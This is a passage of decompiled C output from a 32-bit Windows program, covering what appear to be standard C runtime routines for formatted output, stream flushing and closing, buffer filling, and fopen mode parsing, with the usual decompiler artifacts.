            if ((v144 & 256) == 0) {
                if ((v144 & 1) == 0) {
                    // 0x402531
                    v145 = v139;
                    if ((v144 & 2) != 0) {
                        // 0x402536
                        v9 = 32;
                        v145 = 1;
                    }
                } else {
                    // 0x40252b
                    v9 = 43;
                    v145 = 1;
                }
            } else {
                // 0x402520
                v9 = 45;
                v145 = 1;
            }
        }
        int32_t v146 = v145;
        int32_t v147 = v46 - v146 - v143; // 0x402547
        int32_t * v148 = (int32_t *)(v133 - 4);
        int32_t * v149; // 0x401eff
        int32_t * v150; // 0x401eff
        int32_t * v151; // 0x401eff
        if ((v144 & 12) != 0) {
            // 0x402541
            v151 = (int32_t *)(v133 - 16);
            v150 = (int32_t *)(v133 - 12);
            v149 = (int32_t *)(v133 - 8);
        } else {
            // 0x40254f
            *v148 = v8;
            int32_t * v152 = (int32_t *)(v133 - 8);
            *v152 = a1;
            int32_t * v153 = (int32_t *)(v133 - 12);
            *v153 = v147;
            int32_t * v154 = (int32_t *)(v133 - 16);
            *v154 = 32;
            function_402675((int32_t)&g167, (int32_t)&g167);
            v151 = v154;
            v150 = v153;
            v149 = v152;
        }
        int32_t * v155 = v149;
        int32_t * v156 = v150;
        int32_t * v157 = v151;
        *v148 = v8;
        *v155 = a1;
        *v156 = v146;
        *v157 = v10;
        function_4026a6((int32_t)&g167, (int32_t)&g167, (int32_t)&g167);
        if ((v144 & 8) != 0) {
            if ((v144 & 4) == 0) {
                // 0x402581
                *v148 = v8;
                *v155 = a1;
                *v156 = v147;
                *v157 = 48;
                function_402675((int32_t)&g167, (int32_t)&g167);
            }
        }
        if (v143 < 1 || v137 == 0) {
            // 0x4025da
            *v148 = v8;
            *v155 = a1;
            *v156 = v143;
            *v157 = (int32_t)v135;
            function_4026a6((int32_t)&g167, (int32_t)&g167, (int32_t)&g167);
        } else {
            int32_t v158 = (int32_t)v135;
            int32_t v159 = v143;
            *v148 = v159 & -0x10000 | (int32_t)*(int16_t *)v158;
            *v155 = v12;
            int32_t v160 = function_403e5b((int32_t)&g167, (int32_t)&g167); // 0x4025b2
            while (v160 >= 1) {
                int32_t v161 = v159 - 1;
                *v148 = v8;
                *v155 = a1;
                *v156 = v160;
                *v157 = v12;
                function_4026a6((int32_t)&g167, (int32_t)&g167, (int32_t)&g167);
                int32_t v162 = v158 + 2; // 0x4025d6
                if (v161 == 0) {
                    // break -> 0x4025ef
                    break;
                }
                v158 = v162;
                v159 = v161;
                *v148 = v159 & -0x10000 | (int32_t)*(int16_t *)v158;
                *v155 = v12;
                v160 = function_403e5b((int32_t)&g167, (int32_t)&g167);
            }
        }
        // 0x4025ef
        v18 = v143;
        v39 = v142;
        v14 = 7;
        v65 = v141;
        v55 = v140;
        v47 = v46;
        v44 = v146;
        v77 = v138;
        v51 = v137;
        v72 = v136;
        v26 = v24;
        v30 = v135;
        v60 = v134;
        v16 = v133;
        if ((v138 & 4) != 0) {
            // 0x4025f5
            *v148 = v8;
            *v155 = a1;
            *v156 = v147;
            *v157 = 32;
            function_402675((int32_t)&g167, (int32_t)&g167);
            v18 = v143;
            v39 = v142;
            v14 = 7;
            v65 = v141;
            v55 = v140;
            v47 = v46;
            v44 = v146;
            v77 = v138;
            v51 = v137;
            v72 = v136;
            v26 = v24;
            v30 = v135;
            v60 = v134;
            v16 = v133;
        }
    }
    goto lab_0x402607;
  lab_0x4022ff:
    // 0x4022ff
    v33 = function_403de0((int32_t)&g167);
    v38 = v127;
    v64 = v128;
    v54 = v53;
    v43 = v41;
    v76 = v129;
    v50 = v49;
    v71 = v130;
    v29 = v131;
    v59 = v57;
    v23 = v132 + 4;
    goto lab_0x402509;
  lab_0x402442:;
    int32_t v163 = v114;
    int32_t v164 = v113;
    v116 = v107;
    v115 = v164;
    v117 = v163;
    if (v111 != 0) {
        // 0x402448
        v116 = v107;
        v115 = v164;
        v117 = v163;
        if (v163 < 0 && v163 >= 0 != v163 != 0) {
            // 0x402452
            v116 = v107 | 1;
            v115 = -v164;
            v117 = -((v163 + (int32_t)(v164 != 0)));
        }
    }
    goto lab_0x402467;
  lab_0x402467:;
    char v165 = v116;
    int32_t v166 = v165 <= -1 ? v117 : 0;
    int32_t v167 = v109 >= 0 ? v109 : 1;
    int32_t v168 = v167 - 1; // 0x402496
    int32_t v169 = v168; // 0x40249b
    int32_t v170 = v166; // 0x40249b
    int32_t v171 = v115; // 0x40249b
    int32_t v172 = v22; // 0x40249b
    int32_t v173; // bp-77, 0x401eff
    char ** v174 = (char **)&v173; // 0x40249b
    char ** v175 = (char **)&v173; // 0x40249b
    int32_t v176 = v22; // 0x40249b
    int32_t v177 = v168; // 0x40249b
    if (v167 >= 0 != v167 != 0 != ((v166 || v115) == 0)) {
        int32_t v178 = v169;
        *(int32_t *)(v172 - 4) = 0;
        *(int32_t *)(v172 - 8) = v110;
        *(int32_t *)(v172 - 12) = v170;
        *(int32_t *)(v172 - 16) = v171;
        int32_t v179 = __aullrem(v110, 0); // 0x4024b1
        *(int32_t *)(v172 - 20) = 0;
        int32_t v180 = v179 + 48; // 0x4024bb
        *(int32_t *)(v172 - 24) = v110;
        *(int32_t *)(v172 - 28) = v170;
        int32_t v181 = v172 - 32; // 0x4024c2
        *(int32_t *)v181 = v171;
        int32_t v182 = __aulldiv(); // 0x4024c3
        int32_t v183 = v180 < 58 ? 0 : v106;
        char ** v184 = (char **)((int32_t)v174 - 1);
        *(char *)v174 = (char)(v183 + v180);
        int32_t v185 = v178 - 1; // 0x402496
        v170 = 0;
        v171 = v182;
        v172 = v181;
        v174 = v184;
        v175 = v184;
        v176 = v181;
        v177 = v185;
        while (v178 >= 0 != v178 != 0 != (v182 == 0)) {
            // 0x4024a3
            v178 = v185;
            *(int32_t *)(v172 - 4) = 0;
            *(int32_t *)(v172 - 8) = v110;
            *(int32_t *)(v172 - 12) = v170;
            *(int32_t *)(v172 - 16) = v171;
            v179 = __aullrem(v110, 0);
            *(int32_t *)(v172 - 20) = 0;
            v180 = v179 + 48;
            *(int32_t *)(v172 - 24) = v110;
            *(int32_t *)(v172 - 28) = v170;
            v181 = v172 - 32;
            *(int32_t *)v181 = v171;
            v182 = __aulldiv();
            v183 = v180 < 58 ? 0 : v106;
            v184 = (char **)((int32_t)v174 - 1);
            *(char *)v174 = (char)(v183 + v180);
            v185 = v178 - 1;
            v170 = 0;
            v171 = v182;
            v172 = v181;
            v174 = v184;
            v175 = v184;
            v176 = v181;
            v177 = v185;
        }
    }
    int16_t v186 = v109 >= 0 ? v108 & -9 : v108;
    int32_t v187 = (v166 | v115) != 0 ? v42 : 0;
    int32_t v188 = v177;
    int32_t v189 = v176;
    char ** v190 = v175;
    int32_t v191 = (int32_t)v190; // 0x4024e1
    int32_t v192 = (int32_t)&v173 - v191; // 0x4024e1
    int32_t v193 = v191 + 1; // 0x4024e4
    char ** v194 = (char **)v193; // 0x4024e4
    v33 = v192;
    v38 = v188;
    v64 = v62;
    v54 = v53;
    v43 = v187;
    v76 = v186;
    v50 = v49;
    v71 = v165;
    v29 = v194;
    v59 = v106;
    v23 = v189;
    if ((v165 & 2) != 0) {
        // 0x4024f0
        v33 = v192;
        v38 = v188;
        v64 = v62;
        v54 = v53;
        v43 = v187;
        v76 = v186;
        v50 = v49;
        v71 = v165;
        v29 = v194;
        v59 = v106;
        v23 = v189;
        if (v192 != 0 != (*(char *)v193 == 48)) {
            // 0x4024fc
            *(char *)v190 = 48;
            v33 = v192 + 1;
            v38 = v188;
            v64 = v62;
            v54 = v53;
            v43 = v187;
            v76 = v186;
            v50 = v49;
            v71 = v165;
            v29 = v190;
            v59 = v106;
            v23 = v189;
        }
    }
    goto lab_0x402509;
  lab_0x40241a:
    // 0x40241a
    v111 = v118;
    v113 = v112;
    v114 = v112 >> 31;
    goto lab_0x402442;
  lab_0x402263:;
    int32_t v195 = *(int32_t *)&g20; // 0x402263
    *v80 = v195;
    v127 = v35;
    v128 = v62;
    v129 = v74;
    v130 = v67;
    v131 = (char **)v195;
    v132 = v79;
    goto lab_0x4022ff;
  lab_0x4021ba:;
    char v196 = v69;
    *(int32_t *)(v22 - 4) = v3;
    if ((v74 & 2064) == 0) {
        // 0x402201
        v4 = function_4026de((int32_t)&g167);
        v33 = 1;
        v38 = v35;
        v64 = v62;
        v54 = v53;
        v43 = v41;
        v76 = v74;
        v50 = v49;
        v71 = v196;
        v29 = (char **)&v4;
        v59 = v57;
        v23 = v22;
    } else {
        // 0x4021c6
        *(int32_t *)(v22 - 8) = function_4026fb((int32_t)&g167);
        *(int32_t *)(v22 - 12) = v5;
        int32_t v197 = function_403e5b((int32_t)&g167, (int32_t)&g167); // 0x4021d3
        v33 = v197;
        v38 = v35;
        v64 = v62;
        v54 = v197 >= 0 ? v53 : 1;
        v43 = v41;
        v76 = v74;
        v50 = v49;
        v71 = v196;
        v29 = (char **)&v4;
        v59 = v57;
        v23 = v22;
    }
    goto lab_0x402509;
}

// Address range: 0x402640 - 0x402675
int32_t function_402640(int32_t a1, int32_t a2, int32_t result) {
    int32_t v1 = 0x1000000 * a1 / 0x1000000;
    int32_t * v2 = (int32_t *)(a2 + 4); // 0x402646
    uint32_t v3 = *v2 - 1; // 0x402646
    *v2 = v3;
    int32_t * v4 = (int32_t *)a2;
    int32_t * v5; // 0x402640
    if (v3 >= 0) {
        // 0x402664
        *(char *)*v4 = (char)v1;
        *v4 = *v4 + 1;
        // 0x402671
        v5 = (int32_t *)result;
        *v5 = *v5 + 1;
        return result;
    }
    int32_t * v6 = (int32_t *)result;
    if (function_402ca7(v1, v4) == -1) {
        // 0x40266c
        *v6 = -1;
        return result;
    }
    // 0x402671
    v5 = v6;
    *v5 = *v5 + 1;
    return result;
}

// Address range: 0x402675 - 0x4026a6
int32_t function_402675(int32_t result, int32_t a2) {
    // 0x402675
    if (result < 1) {
        // 0x4026a3
        return result;
    }
    // 0x402686
    int32_t v1; // bp-8, 0x402675
    int32_t v2 = &v1; // 0x402676
    int32_t v3 = result;
    *(int32_t *)(v2 - 4) = a2;
    *(int32_t *)(v2 - 8) = *(int32_t *)(v2 + 20);
    *(int32_t *)(v2 - 12) = *(int32_t *)(v2 + 12);
    int32_t v4 = function_402640((int32_t)&g167, (int32_t)&g167, (int32_t)&g167); // 0x40268f
    int32_t result2 = v4; // 0x40269a
    while (*(int32_t *)a2 != -1) {
        // 0x40269c
        v3--;
        result2 = v3;
        if (v3 >= 0 != v3 != 0) {
            // break -> 0x4026a3
            break;
        }
        *(int32_t *)(v2 - 4) = a2;
        *(int32_t *)(v2 - 8) = *(int32_t *)(v2 + 20);
        *(int32_t *)(v2 - 12) = *(int32_t *)(v2 + 12);
        v4 = function_402640((int32_t)&g167, (int32_t)&g167, (int32_t)&g167);
        result2 = v4;
    }
    // 0x4026a3
    return result2;
}

// Address range: 0x4026a6 - 0x4026de
int32_t function_4026a6(int32_t a1, int32_t result, int32_t a3) {
    // 0x4026a6
    if (result < 1) {
        // 0x4026da
        return result;
    }
    // 0x4026bc
    int32_t v1; // bp-12, 0x4026a6
    int32_t v2 = &v1; // 0x4026af
    int32_t v3 = result;
    int32_t v4 = a1; // 0x4026a6
    *(int32_t *)(v2 - 4) = a3;
    *(int32_t *)(v2 - 8) = *(int32_t *)(v2 + 24);
    *(int32_t *)(v2 - 12) = (int32_t)*(char *)v4;
    int32_t v5 = function_402640((int32_t)&g167, (int32_t)&g167, (int32_t)&g167); // 0x4026c6
    int32_t result2 = v5; // 0x4026d1
    while (*(int32_t *)a3 != -1) {
        // 0x4026d3
        v3--;
        v4++;
        result2 = v3;
        if (v3 >= 0 != v3 != 0) {
            // break -> 0x4026da
            break;
        }
        *(int32_t *)(v2 - 4) = a3;
        *(int32_t *)(v2 - 8) = *(int32_t *)(v2 + 24);
        *(int32_t *)(v2 - 12) = (int32_t)*(char *)v4;
        v5 = function_402640((int32_t)&g167, (int32_t)&g167, (int32_t)&g167);
        result2 = v5;
    }
    // 0x4026da
    return result2;
}

// Address range: 0x4026de - 0x4026eb
int32_t function_4026de(int32_t a1) {
    int32_t * v1 = (int32_t *)a1; // 0x4026e2
    int32_t v2 = *v1; // 0x4026e2
    *v1 = v2 + 4;
    return *(int32_t *)v2;
}

// Address range: 0x4026eb - 0x4026fb
int32_t function_4026eb(int32_t a1) {
    int32_t * v1 = (int32_t *)a1; // 0x4026ef
    int32_t v2 = *v1; // 0x4026ef
    *v1 = v2 + 8;
    return *(int32_t *)v2;
}

// Address range: 0x4026fb - 0x402709
int32_t function_4026fb(int32_t a1) {
    int32_t * v1 = (int32_t *)a1; // 0x4026ff
    int32_t v2 = *v1; // 0x4026ff
    int32_t v3 = v2 + 4; // 0x4026ff
    *v1 = v3;
    return v3 & -0x10000 | (int32_t)*(int16_t *)v2;
}

// Address range: 0x402709 - 0x402751
int32_t function_402709(int32_t lpMem) {
    if (lpMem == 0) {
        // 0x40274f
        int32_t result; // 0x402709
        return result;
    }
    // 0x402712
    function_403cab(9);
    int32_t v1 = function_404043(lpMem); // 0x40271a
    if (v1 != 0) {
        // 0x402725
        function_40406e(v1, lpMem);
        return function_403d0c(9);
    }
    // 0x402738
    function_403d0c(9);
    // 0x40274f
    return HeapFree((int32_t *)g152, 0, (int32_t *)lpMem);
}

// Address range: 0x402751 - 0x4027ae
int32_t function_402751(uint32_t a1) {
    // 0x402751
    if ((int32_t)g155 <= a1) {
        // 0x402796
        *(int32_t *)function_404bb7() = 9;
        *(int32_t *)function_404bc0() = 0;
        return -1;
    }
    int32_t v1 = *(int32_t *)(4 * a1 / 32 + (int32_t)&g153); // 0x402768
    if ((*(char *)(36 * (a1 & 31) + 4 + v1) & 1) == 0) {
        // 0x402796
        *(int32_t *)function_404bb7() = 9;
        *(int32_t *)function_404bc0() = 0;
        return -1;
    }
    // 0x402779
    function_404e29(a1);
    int32_t result = function_4027ae(a1); // 0x402781
    function_404e88(a1);
    return result;
}

// Address range: 0x4027ae - 0x402831
int32_t function_4027ae(int32_t a1) {
    int32_t v1 = a1; // bp-12, 0x4027b4
    int32_t v2 = function_404de7(a1); // 0x4027b5
    int32_t v3; // bp-8, 0x4027ae
    int32_t v4 = &v3; // 0x4027bd
    int32_t v5 = v4; // 0x4027be
    int32_t errorCode = 0; // 0x4027be
    if (v2 == -1) {
        goto lab_0x4027fe;
    } else {
        if (a1 != 1 == (a1 != 2)) {
            goto lab_0x4027e0;
        } else {
            // 0x4027ca
            v1 = 2;
            int32_t v6 = function_404de7(2); // 0x4027cc
            v5 = v4;
            errorCode = 0;
            if (function_404de7(1) == v6) {
                goto lab_0x4027fe;
            } else {
                goto lab_0x4027e0;
            }
        }
    }
  lab_0x4027fe:;
    int32_t * v7 = (int32_t *)(v5 - 4); // 0x4027fe
    *v7 = a1;
    function_404d68((int32_t)&g167);
    int32_t v8 = *(int32_t *)(4 * a1 / 32 + (int32_t)&g153); // 0x40280d
    *(char *)(36 * (a1 & 31) + 4 + v8) = 0;
    int32_t result = 0; // 0x40281e
    if (errorCode != 0) {
        // 0x402820
        *v7 = errorCode;
        function_404b44((int32_t)&g167);
        result = -1;
    }
    // 0x40282e
    return result;
  lab_0x4027e0:;
    int32_t hObject = function_404de7(a1); // 0x4027e1
    v1 = hObject;
    int32_t v9 = &v1; // 0x4027e7
    v5 = v9;
    errorCode = 0;
    if (!CloseHandle((int32_t *)hObject)) {
        // 0x4027f2
        v5 = v9;
        errorCode = GetLastError();
    }
    goto lab_0x4027fe;
}

// Address range: 0x402831 - 0x40285c
int32_t function_402831(int32_t a1) {
    int32_t v1 = a1 + 12; // 0x402836
    int32_t v2 = *(int32_t *)v1; // 0x402836
    int32_t result = v2; // 0x40283b
    if ((v2 & 131) != 0 && (v2 & 8) != 0) {
        int32_t * v3 = (int32_t *)(a1 + 8); // 0x402841
        function_402709(*v3);
        int16_t * v4 = (int16_t *)v1; // 0x402849
        *v4 = *v4 & -1033;
        *(int32_t *)a1 = 0;
        *v3 = 0;
        *(int32_t *)(a1 + 4) = 0;
        result = 0;
    }
    // 0x40285a
    return result;
}

// Address range: 0x40285c - 0x40288a
int32_t function_40285c(int32_t a1) {
    // 0x40285c
    int32_t v1; // 0x40285c
    if (function_40288a(a1, v1) != 0) {
        // 0x40286c
        return -1;
    }
    // 0x402871
    if ((*(char *)(a1 + 13) & 64) == 0) {
        // 0x40286c
        return 0;
    }
    // 0x402877
    return function_404eaa(*(int32_t *)(a1 + 16)) != 0;
}

// Address range: 0x40288a - 0x4028e6
int32_t function_40288a(int32_t a1, int32_t a2) {
    int32_t * v1 = (int32_t *)(a1 + 12); // 0x402893
    int32_t v2 = *v1; // 0x402893
    int32_t * v3 = (int32_t *)(a1 + 8);
    int32_t * v4; // 0x40288a
    int32_t result; // 0x40288a
    if ((v2 & 264) == 0 || (v2 & 3) != 2) {
        // 0x40288a
        v4 = (int32_t *)a1;
        result = 0;
    } else {
        int32_t v5 = *v3; // 0x4028a6
        int32_t * v6 = (int32_t *)a1;
        uint32_t v7 = *v6 - v5; // 0x4028ab
        v4 = v6;
        result = 0;
        if (v7 >= 1) {
            // 0x4028b1
            int32_t v8; // 0x40288a
            int32_t v9 = function_404f3d(*(int32_t *)(a1 + 16), v5, v7, v8); // 0x4028b6
            int32_t v10 = *v1;
            if (v9 != v7) {
                // 0x4028d0
                *v1 = v10 | 32;
                v4 = v6;
                result = -1;
            } else {
                // 0x4028c2
                v4 = v6;
                result = 0;
                if ((char)v10 <= 255) {
                    // 0x4028c9
                    *v1 = v10 & -3;
                    v4 = v6;
                    result = 0;
                }
            }
        }
    }
    // 0x4028d7
    *(int32_t *)(a1 + 4) = 0;
    *v4 = *v3;
    return result;
}

// Address range: 0x4028e6 - 0x4028ef
int32_t function_4028e6(void) {
    // 0x4028e6
    return function_4028ef(1);
}

// Address range: 0x4028ef - 0x402993
int32_t function_4028ef(int32_t a1) {
    // 0x4028ef
    function_403cab(2);
    int32_t v1; // bp-12, 0x4028ef
    int32_t v2 = &v1; // 0x4028ff
    int32_t * v3 = (int32_t *)(v2 - 4);
    int32_t * v4; // 0x4028ef
    int32_t v5; // 0x4028ef
    int32_t v6; // 0x4028ef
    if (g162 < 1) {
        // 0x4028ef
        v4 = (int32_t *)(v2 + 16);
        v5 = 0;
        v6 = 0;
    } else {
        int32_t * v7 = (int32_t *)(v2 - 8);
        int32_t * v8 = (int32_t *)(v2 + 16);
        int32_t v9 = 0;
        int32_t v10 = 0;
        int32_t v11 = 0;
        int32_t v12 = 4 * v10; // 0x40290d
        int32_t v13 = *(int32_t *)(g160 + v12); // 0x40290d
        int32_t v14 = v11; // 0x402912
        int32_t v15 = v9; // 0x402912
        int32_t v16; // 0x4028ef
        int32_t v17; // 0x4028ef
        int32_t v18; // 0x402928
        int32_t v19; // 0x40292b
        int32_t v20; // 0x402933
        int32_t v21; // 0x402956
        if (v13 != 0) {
            // 0x402914
            v14 = v11;
            v15 = v9;
            if ((*(char *)(v13 + 12) & -125) != 0) {
                // 0x40291a
                *v3 = v13;
                *v7 = v10;
                function_401dd3((int32_t)&g167, (int32_t)&g167);
                v18 = *(int32_t *)(g160 + v12);
                v19 = *(int32_t *)(v18 + 12);
                v16 = v11;
                v17 = v9;
                if ((v19 & 131) != 0) {
                    // 0x402933
                    v20 = *v8;
                    if (v20 != 1) {
                        // 0x402949
                        v16 = v11;
                        v17 = v9;
                        if ((v19 & 2) != 0 && v20 == 0) {
                            // 0x402955
                            *v3 = v18;
                            v21 = function_40285c((int32_t)&g167);
                            v16 = v11;
                            v17 = (v21 != -1 ? 0 : v21) | v9;
                        }
                    } else {
                        // 0x40293a
                        *v3 = v18;
                        v16 = v11 + (int32_t)(function_40285c((int32_t)&g167) != -1);
                        v17 = v9;
                    }
                }
                // 0x402963
                *v3 = *(int32_t *)(g160 + v12);
                *v7 = v10;
                function_401e25((int32_t)&g167, (int32_t)&g167);
                v14 = v16;
                v15 = v17;
            }
        }
        int32_t v22 = v15;
        int32_t v23 = v14;
        int32_t v24 = g162; // 0x402974
        int32_t v25 = v10 + 1; // 0x402973
        v4 = v8;
        v5 = v23;
        v6 = v22;
        while (v25 < v24) {
            // 0x402908
            v9 = v22;
            v10 = v25;
            v11 = v23;
            int32_t v26 = v24;
            v12 = 4 * v10;
            v13 = *(int32_t *)(g160 + v12);
            int32_t v27 = v26; // 0x402912
            v14 = v11;
            v15 = v9;
            if (v13 != 0) {
                // 0x402914
                v27 = v26;
                v14 = v11;
                v15 = v9;
                if ((*(char *)(v13 + 12) & -125) != 0) {
                    // 0x40291a
                    *v3 = v13;
                    *v7 = v10;
                    function_401dd3((int32_t)&g167, (int32_t)&g167);
                    v18 = *(int32_t *)(g160 + v12);
                    v19 = *(int32_t *)(v18 + 12);
                    v16 = v11;
                    v17 = v9;
                    if ((v19 & 131) != 0) {
                        // 0x402933
                        v20 = *v8;
                        if (v20 != 1) {
                            // 0x402949
                            v16 = v11;
                            v17 = v9;
                            if ((v19 & 2) != 0 && v20 == 0) {
                                // 0x402955
                                *v3 = v18;
                                v21 = function_40285c((int32_t)&g167);
                                v16 = v11;
                                v17 = (v21 != -1 ? 0 : v21) | v9;
                            }
                        } else {
                            // 0x40293a
                            *v3 = v18;
                            v16 = v11 + (int32_t)(function_40285c((int32_t)&g167) != -1);
                            v17 = v9;
                        }
                    }
                    // 0x402963
                    *v3 = *(int32_t *)(g160 + v12);
                    *v7 = v10;
                    function_401e25((int32_t)&g167, (int32_t)&g167);
                    v27 = g162;
                    v14 = v16;
                    v15 = v17;
                }
            }
            // 0x402973
            v22 = v15;
            v23 = v14;
            v24 = v27;
            v25 = v10 + 1;
            v4 = v8;
            v5 = v23;
            v6 = v22;
        }
    }
    // 0x40297c
    *v3 = 2;
    function_403d0c((int32_t)&g167);
    return *v4 == 1 ? v5 : v6;
}

// Address range: 0x402993 - 0x402a6f
int32_t function_402993(int32_t a1) {
    int32_t * v1 = (int32_t *)(a1 + 12); // 0x402998
    int32_t v2 = *v1; // 0x402998
    if ((v2 & 131) == 0) {
        // 0x402a6a
        return -1;
    }
    if ((v2 & 64) != 0) {
        // 0x402a6a
        return -1;
    }
    if ((v2 & 2) != 0) {
        // 0x4029af
        *v1 = v2 | 32;
        // 0x402a6a
        return -1;
    }
    // 0x4029b9
    *v1 = v2 | 1;
    int32_t * v3; // 0x402993
    if ((v2 & 268) != 0) {
        int32_t * v4 = (int32_t *)(a1 + 8);
        *(int32_t *)a1 = *v4;
        v3 = v4;
    } else {
        // 0x4029c4
        function_40536b(a1);
        v3 = (int32_t *)(a1 + 8);
    }
    int32_t * v5 = (int32_t *)(a1 + 24); // 0x4029d2
    int32_t * v6 = (int32_t *)(a1 + 16); // 0x4029d8
    int32_t v7 = function_40512d(*v6, *v3, *v5); // 0x4029db
    int32_t * v8 = (int32_t *)(a1 + 4); // 0x4029e3
    *v8 = v7;
    if (v7 < 1) {
        // 0x402a59
        *v1 = *v1 | (v7 == 0 ? 16 : 32);
        *v8 = 0;
        // 0x402a6a
        return -1;
    }
    int32_t v9 = *v1; // 0x4029ef
    int32_t v10 = v9; // 0x4029f5
    if ((v9 & 130) == 0) {
        int32_t v11 = *v6; // 0x4029f7
        int32_t v12 = &g27; // 0x4029fe
        if (v11 != -1) {
            int32_t v13 = *(int32_t *)(4 * v11 / 32 + (int32_t)&g153); // 0x402a08
            v12 = v13 + 36 * (v11 & 31);
        }
        // 0x402a1c
        v10 = v9;
        if ((*(char *)(v12 + 4) & -126) == -126) {
            int32_t v14 = v9 | 0x2000; // 0x402a28
            *v1 = v14;
            v10 = v14;
        }
    }
    // 0x402a2e
    if (!(((v10 & 8) == 0 | *v5 != 512))) {
        if ((v10 & 1024) == 0) {
            // 0x402a44
            *v5 = 0x1000;
        }
    }
    int32_t * v15 = (int32_t *)a1; // 0x402a4b
    int32_t v16 = *v15; // 0x402a4b
    *v8 = v7 - 1;
    *v15 = v16 + 1;
    return (int32_t)*(char *)v16;
}

// Address range: 0x402a6f - 0x402bdf
int32_t function_402a6f(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5) {
    char v1 = *(char *)a2; // 0x402a88
    int32_t v2 = 265; // 0x402a6f
    int32_t v3; // 0x402a6f
    int32_t v4; // 0x402a6f
    switch (v1) {
        case 114: {
            // 0x402aa1
            v3 = 0;
            v4 = g99 | 1;
            // break -> 0x402ab0
            break;
        }
        default: {
            // 0x402a92
            v2 = 769;
            if (v1 != 119) {
                // 0x402bda
                return 0;
            }
        }
        case 97: {
            // 0x402aad
            v3 = v2;
            v4 = g99 | 2;
            // break -> 0x402ab0
            break;
        }
    }
    int32_t v5 = a2 + 1; // 0x402ab3
    char v6 = *(char *)v5; // 0x402ab3
    int32_t v7 = v5; // 0x402ab9
    int32_t v8 = 0; // 0x402ab9
    int32_t v9 = 0; // 0x402ab9
    int32_t v10 = v3; // 0x402ab9
    int32_t v11 = v4; // 0x402ab9
    if (v6 != 0) {
        int32_t v12 = v9;
        int32_t v13 = v8;
        int32_t v14; // 0x402a6f
        int32_t v15; // 0x402a6f
        if (v6 > 84) {
            switch (v6) {
                case 98: {
                    // 0x402b8e
                    if ((v3 & 0xc000) != 0) {
                        // break -> 0x402ba2
                        break;
                    }
                    // 0x402b9a
                    v9 = v12;
                    v8 = v13;
                    v14 = v3 | 0x8000;
                    v15 = v4;
                    // break -> 0x402ab3
                    break;
                }
                case 99: {
                    // 0x402b77
                    if (v12 != 0) {
                        // break -> 0x402ba2
                        break;
                    }
                    // 0x402b7c
                    v9 = 1;
                    v8 = v13;
                    v14 = v3;
                    v15 = v4 | 0x4000;
                    // break -> 0x402ab3
                    break;
                }
                case 110: {
                    // 0x402b60
                    if (v12 != 0) {
                        // break -> 0x402ba2
                        break;
                    }
                    // 0x402b65
                    v9 = 1;
                    v8 = v13;
                    v14 = v3;
                    v15 = v4 & -0x4001;
                    // break -> 0x402ab3
                    break;
                }
                default: {
                    // 0x402b4e
                    if (v6 != 116) {
                        // break -> 0x402ba2
                        break;
                    }
                    // 0x402b53
                    if ((v3 & 0xc000) != 0) {
                        // break -> 0x402ba2
                        break;
                    }
                    // 0x402b58
                    v9 = v12;
                    v8 = v13;
                    v14 = v3 | 0x4000;
                    v15 = v4;
                    // break -> 0x402ab3
                    break;
                }
            }
        } else {
            switch (v6) {
                case 84: {
                    // 0x402b31
                    if ((v3 & 0x1000) != 0) {
                        // break -> 0x402ba2
                        break;
                    }
                    // 0x402b3a
                    v9 = v12;
                    v8 = v13;
                    v14 = v3 | 0x1000;
                    v15 = v4;
                    // break -> 0x402ab3
                    break;
                }
                case 43: {
                    // 0x402b1b
                    if ((v3 & 2) != 0) {
                        // break -> 0x402ba2
                        break;
                    }
                    // 0x402b20
                    v9 = v12;
                    v8 = v13;
                    v14 = v3 & -4 | 2;
                    v15 = v4 & -132 | 128;
                    // break -> 0x402ab3
                    break;
                }
                case 68: {
                    // 0x402b11
                    if ((v3 & 64) != 0) {
                        // break -> 0x402ba2
                        break;
                    }
                    // 0x402b16
                    v9 = v12;
                    v8 = v13;
                    v14 = v3 | 64;
                    v15 = v4;
                    // break -> 0x402ab3
                    break;
                }
                case 82: {
                    // 0x402afc
                    if (v13 != 0) {
                        // break -> 0x402ba2
                        break;
                    }
                    // 0x402b05
                    v9 = v12;
                    v8 = 1;
                    v14 = v3 | 16;
                    v15 = v4;
                    // break -> 0x402ab3
                    break;
                }
                default: {
                    // 0x402ae0
                    if (v6 == 83 != (v13 == 0)) {
                        // break -> 0x402ba2
                        break;
                    }
                    // 0x402af0
                    v9 = v12;
                    v8 = 1;
                    v14 = v3 | 32;
                    v15 = v4;
                    // break -> 0x402ab3
                    break;
                }
            }
        }
        int32_t v16 = v15;
        int32_t v17 = v14;
        v7++;
        char v18 = *(char *)v7; // 0x402ab3
        v10 = v17;
        v11 = v16;
        while (v18 != 0) {
            // 0x402ac7
            v12 = v9;
            v13 = v8;
            int32_t v19 = v17;
            int32_t v20 = v16;
            char v21 = v18;
            if (v21 > 84) {
                switch (v21) {
                    case 98: {
                        // 0x402b8e
                        if ((v19 & 0xc000) != 0) {
                            // break -> 0x402ba2
                            break;
                        }
                        // 0x402b9a
                        v9 = v12;
                        v8 = v13;
                        v14 = v19 | 0x8000;
                        v15 = v20;
                        // break -> 0x402ab3
                        break;
                    }
                    case 99: {
                        // 0x402b77
                        if (v12 != 0) {
                            // break -> 0x402ba2
                            break;
                        }
                        // 0x402b7c
                        v9 = 1;
                        v8 = v13;
                        v14 = v19;
                        v15 = v20 | 0x4000;
                        // break -> 0x402ab3
                        break;
                    }
                    case 110: {
                        // 0x402b60
                        if (v12 != 0) {
                            // break -> 0x402ba2
                            break;
                        }
                        // 0x402b65
                        v9 = 1;
                        v8 = v13;
                        v14 = v19;
                        v15 = v20 & -0x4001;
                        // break -> 0x402ab3
                        break;
                    }
                    default: {
                        // 0x402b4e
                        if (v21 != 116) {
                            // break -> 0x402ba2
                            break;
                        }
                        // 0x402b53
                        if ((v19 & 0xc000) != 0) {
                            // break -> 0x402ba2
                            break;
                        }
                        // 0x402b58
                        v9 = v12;
                        v8 = v13;
                        v14 = v19 | 0x4000;
                        v15 = v20;
                        // break -> 0x402ab3
                        break;
                    }
                }
            } else {
                switch (v21) {
                    case 84: {
                        // 0x402b31
                        if ((v19 & 0x1000) != 0) {
                            // break -> 0x402ba2
                            break;
                        }
                        // 0x402b3a
                        v9 = v12;
                        v8 = v13;
                        v14 = v19 | 0x1000;
                        v15 = v20;
                        // break -> 0x402ab3
                        break;
                    }
                    case 43: {
                        // 0x402b1b
                        if ((v19 & 2) != 0) {
                            // break -> 0x402ba2
                            break;
                        }
                        // 0x402b20
                        v9 = v12;
                        v8 = v13;
                        v14 = v19 & -4 | 2;
                        v15 = v20 & -132 | 128;
                        // break -> 0x402ab3
                        break;
                    }
